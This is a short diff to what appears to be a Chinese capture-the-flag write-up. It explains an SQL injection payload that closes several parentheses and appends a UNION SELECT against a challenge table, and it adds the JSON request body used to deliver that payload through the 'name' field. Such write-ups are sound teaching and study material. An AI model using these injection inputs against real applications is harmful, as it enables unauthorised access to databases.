@@ -347,4 +347,10 @@ payload:
 ```sql
 code = '))))))) union select LAMENTXU FROM FATETABLE--+
 ```
-这里的`code`是`name`,
+这里的`code`是`name`,而`name`是json传进入的；
+所以我们需要
+```json
+{
+	"name":"'))))))) union select LAMENTXU FROM FATETABLE--+"
+}
+```
